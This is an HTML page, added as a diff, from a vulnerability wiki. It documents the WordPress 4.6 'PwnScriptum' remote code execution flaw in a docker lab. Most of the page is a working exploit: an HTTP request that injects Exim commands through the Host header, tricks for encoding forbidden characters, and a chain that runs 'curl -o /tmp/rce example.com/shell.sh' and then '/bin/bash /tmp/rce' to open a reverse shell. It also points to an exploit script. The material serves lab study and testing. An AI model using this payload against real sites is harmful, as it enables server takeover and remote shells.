@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Wordpress/pwnscriptum/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum)", url: "#_top", children: [
+              {title: "Reference link", url: "#reference-link" },
+              {title: "Environment setup", url: "#environment-setup" },
+              {title: "Exploit", url: "#exploit" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Wordpress 4.6 任意命令执行漏洞（PwnScriptum）
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/" class="btn btn-xs btn-link">
+        （从xss到getshell） xss的深层次利用与探讨
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="wordpress-46-remote-code-execution-vulnerability-pwnscriptum">Wordpress 4.6 Remote Code Execution Vulnerability (PwnScriptum)<a class="headerlink" href="#wordpress-46-remote-code-execution-vulnerability-pwnscriptum" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<h2 id="reference-link">Reference link<a class="headerlink" href="#reference-link" title="Permanent link">&para;</a></h2>
+<p><a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a></p>
+<h2 id="environment-setup">Environment setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>docker compose build
+docker compose up -d
+</code></pre></div>
+<p>Because Mysql initialization needs a little time, so please wait. After initialization succeeds, visit <code>http://your-ip:8080/</code>, set the administrator username and password to use it (the database is configured and not automatically updated).</p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>Send the following packet, and you can see that <code>/tmp/success</code> has been successfully created:</p>
+<div class="highlight"><pre><span></span><code>POST /wp-login.php?action=lostpassword HTTP/1.1
+Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
+Connection: close
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Accept: */*
+Content-Length: 56
+Content-Type: application/x-www-form-urlencoded
+
+wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin
+</code></pre></div>
+<p>We need to meet the following requirements to exploit this vulnerability:</p>
+<ol>
+<li>The executed command cannot contain some special characters, such as <code>:</code>, <code>'</code>,<code>"</code>, etc.</li>
+<li>The command will be converted to lowercase letters</li>
+<li>The command needs to use an absolute path</li>
+<li>Need know an existing user username</li>
+</ol>
+<p>In order to solve these problems, the vulnerability author came up with <code>${substr{0}{1}{$spool_directory}}</code> instead of <code>/</code>, using <code>${substr{10}{1}{$tod_log}}</code> method of replacing spaces.</p>
+<p>However, there are still a lot of characters can't be used. So we need to put the command on the third-party website, and then download it to <code>/tmp</code> directory by <code>curl -o /tmp/rce example.com/shell.sh</code>.</p>
+<p>Therefore, the expliot process is follows:</p>
+<ul>
+<li>Write the exp of reverse shell and put it on a site. The exp have this following requirements:</li>
+<li>the entire url's uppercase letters will be converted to lowercase, so the file path should not contain uppercase letters.</li>
+<li>Access to this page can't be redirected because the parameter for follow redirect is <code>-L</code> (uppercase).</li>
+<li>Splice the command<code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code>and<code>/bin/bash /tmp/rce</code>.</li>
+<li>Convert the spaces and <code>/</code> in the command to <code>${substr{10}{1}{$tod_log}}</code> and <code>${substr{0}{1}{$spool_directory}}</code>.</li>
+<li>Produce the HTTP Host header:<code>target(any -froot@localhost -be ${run{command}} null)</code>.</li>
+<li>Send these two packets in order.</li>
+</ul>
+<p>Here is <a href="exploit.py">expliot.py</a>，change <code>target</code> to your target site，change <code>user</code> to an exist user name，change <code>shell_url</code> to your payload site.</p>
+<p>Execute to get the shell:</p>
+<p><img alt="" src="1.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Wordpress 4.6 任意命令执行漏洞（PwnScriptum）
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88%E4%BB%8Exss%E5%88%B0getshell%EF%BC%89%20xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8/" class="btn btn-xs btn-link">
+        （从xss到getshell） xss的深层次利用与探讨
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
